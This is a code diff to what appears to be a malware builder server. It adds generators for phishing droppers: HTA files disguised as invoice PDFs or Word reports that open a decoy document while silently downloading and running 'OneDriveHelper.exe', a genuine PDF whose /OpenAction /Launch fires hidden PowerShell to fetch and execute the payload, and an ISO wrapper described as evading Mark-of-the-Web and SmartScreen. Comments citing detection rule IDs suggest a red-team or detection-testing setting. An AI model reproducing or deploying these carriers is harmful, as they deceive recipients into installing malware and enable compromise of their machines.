@@ -169,19 +169,46 @@ router.get("/api/builder/carrier", requireAdmin, (req, res) => {
   const payload = `${proto}://${host}/dl/exe`;
   const saveTo  = "%TEMP%\\OneDriveHelper.exe";
 
+    const decoyPdfUrl  = `${proto}://${host}/dl/decoy-pdf`;
+  const decoyDocUrl  = `${proto}://${host}/dl/decoy-doc`;
+
   const carriers = {
-    hta: () => ({ name: "OneDriveSetup.hta", mime: "application/hta",          body: buildHta(payload, saveTo) }),
-    ps1: () => ({ name: "OneDriveSetup.ps1", mime: "application/octet-stream", body: buildPs1(payload, saveTo) }),
-    vbs: () => ({ name: "OneDriveSetup.vbs", mime: "application/octet-stream", body: buildVbs(payload, saveTo) }),
-    bat: () => ({ name: "OneDriveSetup.bat", mime: "application/octet-stream", body: buildBat(payload, saveTo) }),
-    lnk: () => ({ name: "OneDriveSetup.lnk", mime: "application/octet-stream", body: buildLnk(payload) }),
+    hta:  () => ({ name: "OneDriveSetup.hta",              mime: "application/hta",          body: buildHta(payload, saveTo) }),
+    ps1:  () => ({ name: "OneDriveSetup.ps1",              mime: "application/octet-stream", body: buildPs1(payload, saveTo) }),
+    vbs:  () => ({ name: "OneDriveSetup.vbs",              mime: "application/octet-stream", body: buildVbs(payload, saveTo) }),
+    bat:  () => ({ name: "OneDriveSetup.bat",              mime: "application/octet-stream", body: buildBat(payload, saveTo) }),
+    lnk:  () => ({ name: "OneDriveSetup.lnk",             mime: "application/octet-stream", body: buildLnk(payload) }),
+    // Document-disguised carriers — open a real decoy document + silently run payload
+    // Rename .hta → e.g. "Invoice.pdf        .hta" or distribute as-is; on Windows with
+    // "hide extensions" the .hta part disappears. pname=mshta.exe → DR_017 fires.
+    pdf:  () => ({ name: "Invoice_Q4-2024.pdf.hta",        mime: "application/hta",          body: buildDocCarrier(payload, decoyPdfUrl, "%TEMP%\\~invoice.pdf",   "pdf",  saveTo) }),
+    // Genuine .pdf — real invoice, /OpenAction /Launch fires powershell hidden.
+    // pname = AcroRd32.exe / Acrobat.exe / FoxitReader → DR_016 fires.
+    pdfexec: () => ({ name: "Invoice_Q4-2024.pdf", mime: "application/pdf", body: buildExecPdf(payload) }),
+    word: () => ({ name: "Q4_Report_Draft.docx.hta",       mime: "application/hta",          body: buildDocCarrier(payload, decoyDocUrl, "%TEMP%\\~report.docx",   "word", saveTo) }),
+    // ISO wrapping — no Mark-of-the-Web → SmartScreen is bypassed on older/unpatched Windows
+    // pname = parent of whatever runs the exe inside the ISO (typically explorer.exe → DR_001)
+    iso:  () => ({ name: null, sync: true, fn: (cb) => buildIso(cb) }),
   };
 
   if (!carriers[type]) {
-    return res.status(400).json({ error: "Unknown type. Use: hta, ps1, vbs, bat, lnk" });
+    return res.status(400).json({ error: "Unknown type. Use: hta, ps1, vbs, bat, lnk, pdf, pdfexec, word, iso" });
   }
 
-  const { name, mime, body } = carriers[type]();
+  const entry = carriers[type]();
+
+  // ISO is generated async/sync via child_process
+  if (entry.sync) {
+    return entry.fn((err, isoBuf) => {
+      if (err) return res.status(500).json({ error: err });
+      res.setHeader("Content-Type", "application/x-iso9660-image");
+      res.setHeader("Content-Disposition", 'attachment; filename="OneDriveSetup.iso"');
+      res.send(isoBuf);
+      console.log(`[carrier] generated iso  size=${isoBuf.length}`);
+    });
+  }
+
+  const { name, mime, body } = entry;
   res.setHeader("Content-Type", mime);
   res.setHeader("Content-Disposition", `attachment; filename="${name}"`);
   res.send(body);
@@ -296,6 +323,462 @@ function buildLnk(url) {
   const target = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
   const args   = `-w hidden -nop -c "try{$wc=New-Object Net.WebClient;$wc.Headers.Add('User-Agent','Mozilla/5.0');$dest=$env:TEMP+'\\OneDriveHelper.exe';$wc.DownloadFile('${url}',$dest);Start-Process $dest -WindowStyle Hidden}catch{}"`;
   return createLnkBuffer(target, args);
+}
+
+// ── Document-disguised carrier ────────────────────────────────────────────────
+// HTA that runs invisible, opens a real decoy document, then silently installs.
+// type = "pdf" | "word"  — controls which viewer is opened and which icon hint to use.
+function buildDocCarrier(payloadUrl, decoyUrl, decoyTmp, type, exeTmp) {
+  const icoLabel = type === "pdf" ? "&#128196;" : "&#128196;";
+  const label    = type === "pdf" ? "PDF Document" : "Word Document";
+  return `<html>
+<head><title>${label}</title>
+<hta:application id="c" applicationName="${label}" border="none" caption="no"
+  showInTaskbar="no" singleInstance="yes" windowState="minimize"/>
+</head>
+<body>
+<script language="VBScript">
+Sub Window_OnLoad
+  window.resizeTo 1, 1
+  window.moveTo -9000, -9000
+  On Error Resume Next
+
+  Dim sh : Set sh = CreateObject("WScript.Shell")
+  Dim decoy : decoy = sh.ExpandEnvironmentStrings("${decoyTmp}")
+  Dim dest  : dest  = sh.ExpandEnvironmentStrings("${exeTmp}")
+
+  ' 1. Download and open the decoy document — user sees this
+  Dim xhr : Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.open "GET", "${decoyUrl}", False
+  xhr.send
+  If xhr.status = 200 Then
+    Dim s : Set s = CreateObject("ADODB.Stream")
+    s.Open : s.Type = 1
+    s.Write xhr.responseBody
+    s.SaveToFile decoy, 2 : s.Close
+    sh.Run Chr(34) & decoy & Chr(34), 1, False
+  End If
+
+  ' 2. Download and run payload silently in background
+  Set xhr = CreateObject("MSXML2.XMLHTTP")
+  xhr.open "GET", "${payloadUrl}", False
+  xhr.send
+  If xhr.status = 200 Then
+    Dim s2 : Set s2 = CreateObject("ADODB.Stream")
+    s2.Open : s2.Type = 1
+    s2.Write xhr.responseBody
+    s2.SaveToFile dest, 2 : s2.Close
+    sh.Run Chr(34) & dest & Chr(34), 0, False
+  End If
+
+  window.close
+End Sub
+</script>
+</body>
+</html>`;
+}
+
+// ── ISO carrier ───────────────────────────────────────────────────────────────
+// Wraps OneDriveHelper.exe inside a mountable ISO (no MOTW on older/unpatched Windows).
+// Requires genisoimage on Linux: sudo apt install genisoimage
+function buildIso(callback) {
+  if (!fs.existsSync(DL_HELPER)) {
+    return callback("OneDriveHelper.exe not found — build it first from the Builder page above.");
+  }
+  const { execSync } = require("child_process");
+  const tmpDir  = `/tmp/iso_stage_${Date.now()}`;
+  const isoPath = `/tmp/OneDriveSetup_${Date.now()}.iso`;
+  try {
+    fs.mkdirSync(tmpDir, { recursive: true });
+    fs.copyFileSync(DL_HELPER, `${tmpDir}/OneDriveHelper.exe`);
+    execSync(`genisoimage -quiet -J -R -o "${isoPath}" -V "OneDriveSetup" "${tmpDir}"`,
+             { timeout: 30_000 });
+    const buf = fs.readFileSync(isoPath);
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(isoPath); } catch (_) {}
+    callback(null, buf);
+  } catch (e) {
+    try { fs.rmSync(tmpDir, { recursive: true, force: true }); } catch (_) {}
+    try { fs.unlinkSync(isoPath); } catch (_) {}
+    const msg = e.message || "";
+    callback(
+      msg.includes("ENOENT") || msg.toLowerCase().includes("not found")
+        ? "genisoimage not found — install with: sudo apt install genisoimage"
+        : "ISO build failed: " + msg.split("\n")[0]
+    );
+  }
+}
+
+// ── Decoy document endpoints ──────────────────────────────────────────────────
+// Serve realistic-looking decoy documents opened by the document-carrier HTA.
+
+router.get("/dl/decoy-pdf", (_req, res) => {
+  res.setHeader("Content-Type", "application/pdf");
+  res.setHeader("Content-Disposition", 'inline; filename="invoice.pdf"');
+  res.send(buildDecoyPdf());
+});
+
+router.get("/dl/decoy-doc", (_req, res) => {
+  res.setHeader("Content-Type",
+    "application/vnd.openxmlformats-officedocument.wordprocessingml.document");
+  res.setHeader("Content-Disposition", 'inline; filename="document.docx"');
+  res.send(buildDecoyDocx());
+});
+
+// ── Decoy PDF generator ───────────────────────────────────────────────────────
+// Generates a realistic invoice PDF using pure PDF content stream operators.
+// No hidden payload — purely the decoy shown to the target user.
+function buildDecoyPdf() {
+  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
+  const now = new Date();
+  const fmtD = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
+  const due  = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
+
+  const esc = s =>
+    String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+
+  // PDF text helper — uses absolute text matrix (1 0 0 1 x y Tm = move to x,y)
+  const T = (x, y, font, size, text) =>
+    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;
+
+  // Horizontal rule lines (path operators, outside BT block)
+  const rules = [
+    "0.6 G",
+    "50 680 m 562 680 l S",   // after company header
+    "50 543 m 562 543 l S",   // table header top
+    "50 529 m 562 529 l S",   // table header bottom
+    "50 463 m 562 463 l S",   // after items
+    "50 437 m 562 437 l S",   // after totals
+    "50 400 m 562 400 l S",   // before payment
+    "0 G",
+  ].join("\n");
+
+  const textOps = [
+    T(50, 720, "F2", 18, "Nexus Solutions Ltd."),
+    T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
+    T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
+    T(50, 660, "F2", 14, "INVOICE"),
+    T(50, 642, "F1",  9, "Invoice Number:   " + invNum),
+    T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
+    T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
+    T(50, 590, "F2",  9, "Bill To:"),
+    T(50, 577, "F1",  9, "Acme Corporation"),
+    T(50, 564, "F1",  9, "Finance Department"),
+    T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
+    // Table header
+    T( 55, 534, "F2", 9, "Description"),
+    T(385, 534, "F2", 9, "Qty"),
+    T(420, 534, "F2", 9, "Unit Price"),
+    T(495, 534, "F2", 9, "Total"),
+    // Line items
+    T( 55, 518, "F1", 9, "Professional Services - Q4 Consulting"),
+    T(388, 518, "F1", 9, "1"), T(420, 518, "F1", 9, "$4,200.00"), T(495, 518, "F1", 9, "$4,200.00"),
+    T( 55, 505, "F1", 9, "Software License Renewal (Annual)"),
+    T(388, 505, "F1", 9, "1"), T(420, 505, "F1", 9, "$1,800.00"), T(495, 505, "F1", 9, "$1,800.00"),
+    T( 55, 492, "F1", 9, "Technical Support — 12 hrs @ $80/hr"),
+    T(385, 492, "F1", 9, "12"), T(420, 492, "F1", 9, "$80.00"),    T(495, 492, "F1", 9, "$960.00"),
+    T( 55, 479, "F1", 9, "Cloud Infrastructure — November 2024"),
+    T(388, 479, "F1", 9, "1"), T(420, 479, "F1", 9, "$340.00"),   T(495, 479, "F1", 9, "$340.00"),
+    // Totals
+    T(400, 452, "F1",  9, "Subtotal:"),   T(495, 452, "F1",  9, "$7,300.00"),
+    T(400, 439, "F1",  9, "VAT (20%):"), T(495, 439, "F1",  9, "$1,460.00"),
+    T(400, 422, "F2", 10, "TOTAL DUE:"), T(495, 422, "F2", 10, "$8,760.00"),
+    // Payment
+    T(50, 388, "F2",  9, "Payment Instructions:"),
+    T(50, 375, "F1",  9, "Bank: National Westminster Bank Plc"),
+    T(50, 362, "F1",  9, "Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum),
+    T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
+    T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
+    T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
+  ];
+
+  const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
+  const cBuf = Buffer.from(content, "latin1");
+
+  // Build PDF with offset-tracked xref table
+  const parts = [];
+  const off  = {};
+  const add  = s => parts.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "latin1"));
+  const pos  = () => parts.reduce((n, b) => n + b.length, 0);
+
+  add("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n");
+  off[1] = pos(); add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n");
+  off[2] = pos(); add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");
+  off[3] = pos(); add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n" +
+    "   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >>\n   /Contents 4 0 R >>\nendobj\n\n");
+  off[4] = pos();
+  add(`4 0 obj\n<< /Length ${cBuf.length} >>\nstream\n`);
+  parts.push(cBuf);
+  add("\nendstream\nendobj\n\n");
+  off[5] = pos(); add("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>\nendobj\n\n");
+  off[6] = pos(); add("6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>\nendobj\n\n");
+
+  const xrefPos = pos();
+  let xr = "xref\n0 7\n0000000000 65535 f \n";
+  for (let i = 1; i <= 6; i++) xr += String(off[i]).padStart(10, "0") + " 00000 n \n";
+  xr += `trailer\n<< /Root 1 0 R /Size 7 >>\nstartxref\n${xrefPos}\n%%EOF\n`;
+  add(xr);
+
+  return Buffer.concat(parts);
+}
+
+// ── Genuine PDF with embedded /Launch action ──────────────────────────────────
+// A real, openable .pdf file (not .hta).  The PDF reader shows the invoice
+// normally.  The /OpenAction /Launch entry fires powershell silently alongside
+// the visible document.
+//   Modern Adobe Reader (v10+): shows a one-click "Allow" security dialog.
+//   Foxit / SumatraPDF / unpatched readers: fires without any dialog.
+//   pname = AcroRd32.exe / Acrobat.exe / FoxitReader.exe → DR_016 fires.
+function buildExecPdf(payloadUrl) {
+  // Escape a string for use inside a PDF literal-string ( ... )
+  const pdfStr = s => s
+    .replace(/\\/g, "\\\\")
+    .replace(/\(/g, "\\(")
+    .replace(/\)/g, "\\)");
+
+  const psArgs = pdfStr(
+    `-w hidden -nop -c "$wc=New-Object Net.WebClient;` +
+    `$wc.DownloadFile('${payloadUrl}',$env:TEMP+'\\OneDriveHelper.exe');` +
+    `Start-Process ($env:TEMP+'\\OneDriveHelper.exe') -WindowStyle Hidden"`
+  );
+
+  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
+  const now = new Date();
+  const fmtD = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
+  const due  = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
+
+  const esc = s =>
+    String(s).replace(/\\/g,"\\\\").replace(/\(/g,"\\(").replace(/\)/g,"\\)");
+  const T = (x, y, font, size, text) =>
+    `/${font} ${size} Tf 1 0 0 1 ${x} ${y} Tm (${esc(text)}) Tj`;
+
+  const rules = [
+    "0.6 G",
+    "50 680 m 562 680 l S",
+    "50 543 m 562 543 l S",
+    "50 529 m 562 529 l S",
+    "50 463 m 562 463 l S",
+    "50 437 m 562 437 l S",
+    "50 400 m 562 400 l S",
+    "0 G",
+  ].join("\n");
+
+  const textOps = [
+    T(50, 720, "F2", 18, "Nexus Solutions Ltd."),
+    T(50, 702, "F1",  9, "123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom"),
+    T(50, 690, "F1",  9, "Tel: +44 20 7946 0958   |   accounts@nexus-solutions.co.uk"),
+    T(50, 660, "F2", 14, "INVOICE"),
+    T(50, 642, "F1",  9, "Invoice Number:   " + invNum),
+    T(50, 629, "F1",  9, "Invoice Date:     " + fmtD(now)),
+    T(50, 616, "F1",  9, "Payment Due:      " + fmtD(due)),
+    T(50, 590, "F2",  9, "Bill To:"),
+    T(50, 577, "F1",  9, "Acme Corporation"),
+    T(50, 564, "F1",  9, "Finance Department"),
+    T(50, 551, "F1",  9, "456 Corporate Avenue, New York, NY 10001"),
+    T( 55, 534, "F2", 9, "Description"),
+    T(385, 534, "F2", 9, "Qty"),
+    T(420, 534, "F2", 9, "Unit Price"),
+    T(495, 534, "F2", 9, "Total"),
+    T( 55, 518, "F1", 9, "Professional Services - Q4 Consulting"),
+    T(388, 518, "F1", 9, "1"), T(420, 518, "F1", 9, "$4,200.00"), T(495, 518, "F1", 9, "$4,200.00"),
+    T( 55, 505, "F1", 9, "Software License Renewal (Annual)"),
+    T(388, 505, "F1", 9, "1"), T(420, 505, "F1", 9, "$1,800.00"), T(495, 505, "F1", 9, "$1,800.00"),
+    T( 55, 492, "F1", 9, "Technical Support — 12 hrs @ $80/hr"),
+    T(385, 492, "F1", 9, "12"), T(420, 492, "F1", 9, "$80.00"),   T(495, 492, "F1", 9, "$960.00"),
+    T( 55, 479, "F1", 9, "Cloud Infrastructure — November 2024"),
+    T(388, 479, "F1", 9, "1"), T(420, 479, "F1", 9, "$340.00"),  T(495, 479, "F1", 9, "$340.00"),
+    T(400, 452, "F1",  9, "Subtotal:"),   T(495, 452, "F1",  9, "$7,300.00"),
+    T(400, 439, "F1",  9, "VAT (20%):"), T(495, 439, "F1",  9, "$1,460.00"),
+    T(400, 422, "F2", 10, "TOTAL DUE:"), T(495, 422, "F2", 10, "$8,760.00"),
+    T(50, 388, "F2",  9, "Payment Instructions:"),
+    T(50, 375, "F1",  9, "Bank: National Westminster Bank Plc"),
+    T(50, 362, "F1",  9, "Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum),
+    T(50, 349, "F1",  9, "SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819"),
+    T(50, 320, "F1",  8, "Thank you for your business. Payment due within 30 days of invoice date."),
+    T(50, 309, "F1",  8, "Late payments subject to 2% monthly interest. E&OE."),
+  ];
+
+  const content = rules + "\nBT\n" + textOps.join("\n") + "\nET\n";
+  const cBuf = Buffer.from(content, "latin1");
+
+  const parts = [];
+  const off  = {};
+  const add  = s => parts.push(Buffer.isBuffer(s) ? s : Buffer.from(s, "latin1"));
+  const pos  = () => parts.reduce((n, b) => n + b.length, 0);
+
+  // Object 7: the Launch action — powershell runs hidden, payload downloaded + executed
+  // /D sets working dir to System32 so powershell.exe resolves without full path
+  const launchObj =
+    `7 0 obj\n` +
+    `<< /Type /Action /S /Launch\n` +
+    `   /Win << /F (powershell.exe)\n` +
+    `           /P (${psArgs})\n` +
+    `           /D (C:\\\\Windows\\\\System32) >> >>\n` +
+    `endobj\n\n`;
+
+  add("%PDF-1.4\n%\xe2\xe3\xcf\xd3\n");
+  // Catalog now references the launch action via /OpenAction
+  off[1] = pos(); add("1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 7 0 R >>\nendobj\n\n");
+  off[2] = pos(); add("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n");
+  off[3] = pos(); add("3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]\n" +
+    "   /Resources << /Font << /F1 5 0 R /F2 6 0 R >> >>\n   /Contents 4 0 R >>\nendobj\n\n");
+  off[4] = pos();
+  add(`4 0 obj\n<< /Length ${cBuf.length} >>\nstream\n`);
+  parts.push(cBuf);
+  add("\nendstream\nendobj\n\n");
+  off[5] = pos(); add("5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica /Encoding /WinAnsiEncoding >>\nendobj\n\n");
+  off[6] = pos(); add("6 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica-Bold /Encoding /WinAnsiEncoding >>\nendobj\n\n");
+  off[7] = pos(); add(launchObj);
+
+  const xrefPos = pos();
+  let xr = "xref\n0 8\n0000000000 65535 f \n";
+  for (let i = 1; i <= 7; i++) xr += String(off[i]).padStart(10, "0") + " 00000 n \n";
+  xr += `trailer\n<< /Root 1 0 R /Size 8 >>\nstartxref\n${xrefPos}\n%%EOF\n`;
+  add(xr);
+
+  return Buffer.concat(parts);
+}
+
+// ── Decoy DOCX generator ──────────────────────────────────────────────────────
+// Generates a minimal but realistic DOCX (Open XML) invoice document.
+// DOCX = ZIP containing XML files — built from scratch without external dependencies.
+
+const CRC32_TABLE = (() => {
+  const t = new Uint32Array(256);
+  for (let n = 0; n < 256; n++) {
+    let c = n;
+    for (let k = 0; k < 8; k++) c = (c & 1) ? (0xEDB88320 ^ (c >>> 1)) : (c >>> 1);
+    t[n] = c >>> 0;
+  }
+  return t;
+})();
+
+function crc32buf(buf) {
+  let c = 0xFFFFFFFF;
+  for (let i = 0; i < buf.length; i++) c = CRC32_TABLE[(c ^ buf[i]) & 0xFF] ^ (c >>> 8);
+  return (c ^ 0xFFFFFFFF) >>> 0;
+}
+
+function buildZip(entries) {
+  // entries: [{name: string, data: Buffer}]  — stored uncompressed for simplicity
+  const localParts = [];
+  const cdParts    = [];
+  let   offset     = 0;
+
+  for (const { name, data } of entries) {
+    const nameBuf = Buffer.from(name, "utf8");
+    const crc     = crc32buf(data);
+    const lh      = Buffer.alloc(30 + nameBuf.length, 0);
+    lh.writeUInt32LE(0x04034b50, 0);
+    lh.writeUInt16LE(20, 4);
+    lh.writeUInt32LE(crc, 14);
+    lh.writeUInt32LE(data.length, 18);
+    lh.writeUInt32LE(data.length, 22);
+    lh.writeUInt16LE(nameBuf.length, 26);
+    nameBuf.copy(lh, 30);
+
+    const cd = Buffer.alloc(46 + nameBuf.length, 0);
+    cd.writeUInt32LE(0x02014b50, 0);
+    cd.writeUInt16LE(20, 4);
+    cd.writeUInt16LE(20, 6);
+    cd.writeUInt32LE(crc, 16);
+    cd.writeUInt32LE(data.length, 20);
+    cd.writeUInt32LE(data.length, 24);
+    cd.writeUInt16LE(nameBuf.length, 28);
+    cd.writeUInt32LE(offset, 42);
+    nameBuf.copy(cd, 46);
+
+    localParts.push(lh, data);
+    cdParts.push(cd);
+    offset += lh.length + data.length;
+  }
+
+  const cdBuf  = Buffer.concat(cdParts);
+  const eocd   = Buffer.alloc(22, 0);
+  eocd.writeUInt32LE(0x06054b50, 0);
+  eocd.writeUInt16LE(entries.length, 8);
+  eocd.writeUInt16LE(entries.length, 10);
+  eocd.writeUInt32LE(cdBuf.length, 12);
+  eocd.writeUInt32LE(offset, 16);
+
+  return Buffer.concat([...localParts, cdBuf, eocd]);
+}
+
+function buildDecoyDocx() {
+  const invNum = "INV-" + (Math.floor(Math.random() * 9000) + 1000);
+  const now    = new Date();
+  const fmtD   = d => d.toLocaleDateString("en-US", { year:"numeric", month:"long", day:"numeric" });
+  const due    = new Date(now.getTime() + 30 * 24 * 3600 * 1000);
+  const x      = s => s.replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+
+  const para = (text, bold = false, sz = 22) => {
+    const rpr = bold ? `<w:rPr><w:b/><w:sz w:val="${sz}"/></w:rPr>` : `<w:rPr><w:sz w:val="${sz}"/></w:rPr>`;
+    return `<w:p><w:r>${rpr}<w:t>${x(text)}</w:t></w:r></w:p>`;
+  };
+  const row = (cells) => `<w:tr>${cells.map(c =>
+    `<w:tc><w:tcPr><w:tcW w:w="2380" w:type="dxa"/></w:tcPr><w:p><w:r><w:rPr><w:sz w:val="18"/></w:rPr><w:t>${x(c)}</w:t></w:r></w:p></w:tc>`
+  ).join("")}</w:tr>`;
+
+  const docXml = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
+<w:body>
+${para("Nexus Solutions Ltd.", true, 48)}
+${para("123 Commerce Drive, Suite 400, London EC1A 1BB, United Kingdom", false, 18)}
+${para("Tel: +44 20 7946 0958  |  accounts@nexus-solutions.co.uk", false, 18)}
+${para(" ")}
+${para("INVOICE", true, 36)}
+${para("Invoice Number:  " + invNum, false, 20)}
+${para("Invoice Date:    " + fmtD(now), false, 20)}
+${para("Payment Due:     " + fmtD(due), false, 20)}
+${para(" ")}
+${para("Bill To:", true, 20)}
+${para("Acme Corporation", false, 20)}
+${para("Finance Department", false, 20)}
+${para("456 Corporate Avenue, New York, NY 10001", false, 20)}
+${para(" ")}
+<w:tbl>
+<w:tblPr><w:tblStyle w:val="TableGrid"/><w:tblW w:w="9520" w:type="dxa"/></w:tblPr>
+${row(["Description","Qty","Unit Price","Total"])}
+${row(["Professional Services - Q4 Consulting","1","$4,200.00","$4,200.00"])}
+${row(["Software License Renewal (Annual)","1","$1,800.00","$1,800.00"])}
+${row(["Technical Support - 12 hrs @ $80/hr","12","$80.00","$960.00"])}
+${row(["Cloud Infrastructure - November 2024","1","$340.00","$340.00"])}
+${row(["","","Subtotal:","$7,300.00"])}
+${row(["","","VAT (20%):","$1,460.00"])}
+${row(["","","TOTAL DUE:","$8,760.00"])}
+</w:tbl>
+${para(" ")}
+${para("Payment Instructions:", true, 20)}
+${para("Bank: National Westminster Bank Plc", false, 18)}
+${para("Account: 12345678   Sort Code: 60-00-01   Reference: " + invNum, false, 18)}
+${para("SWIFT: NWBKGB2L   IBAN: GB29NWBK60161331926819", false, 18)}
+${para(" ")}
+${para("Thank you for your business. Payment is due within 30 days of invoice date.", false, 16)}
+<w:sectPr/>
+</w:body>
+</w:document>`;
+
+  const ct = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
+  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
+  <Default Extension="xml" ContentType="application/xml"/>
+  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
+</Types>`;
+
+  const rels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
+  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
+</Relationships>`;
+
+  const docRels = `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>`;
+
+  return buildZip([
+    { name: "[Content_Types].xml",        data: Buffer.from(ct,      "utf8") },
+    { name: "_rels/.rels",                data: Buffer.from(rels,    "utf8") },
+    { name: "word/document.xml",          data: Buffer.from(docXml,  "utf8") },
+    { name: "word/_rels/document.xml.rels", data: Buffer.from(docRels,"utf8") },
+  ]);
 }
 
 // Minimal [MS-SHLLINK] .lnk binary format
